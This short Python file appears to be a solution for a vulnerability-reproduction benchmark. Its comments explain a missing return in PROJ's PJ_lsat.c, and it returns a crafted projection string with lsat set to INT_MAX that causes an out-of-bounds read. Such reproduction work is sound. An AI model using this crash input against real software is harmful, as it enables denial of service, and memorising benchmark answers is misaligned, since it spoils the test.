class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a missing return statement in PJ_lsat.c when the 'lsat' parameter is invalid (> 5).
        # This causes the code to proceed and use the invalid 'lsat' value as an index for static arrays,
        # resulting in an out-of-bounds read. By providing a very large integer (INT_MAX),
        # we ensure the read accesses unmapped memory or causes a sanitizer error (e.g., OOB/SEGV),
        # satisfying the crash requirement. The 'path' parameter is required to bypass a subsequent check.
        return b"+proj=lsat +lsat=2147483647 +path=1"